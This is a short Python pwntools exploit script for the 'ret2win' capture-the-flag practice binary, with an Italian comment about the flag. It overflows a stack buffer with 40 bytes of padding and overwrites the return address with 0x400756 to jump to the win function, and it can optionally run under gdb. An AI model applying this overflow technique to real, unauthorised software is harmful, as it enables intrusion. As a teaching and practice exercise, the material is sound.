#!/usr/bin/env python3
from pwn import p64, process, gdb, args

if args.GDB:
    p = gdb.debug("./ret2win", """
    b *pwnme+108
    continue    
    """)
else:
    p = process("./ret2win")
p.recvuntil(b"> ")
p.sendline(b"A"*40 + p64(0x400756))
p.interactive() # non printa la flag ma facciamo finta che l'abbia fatto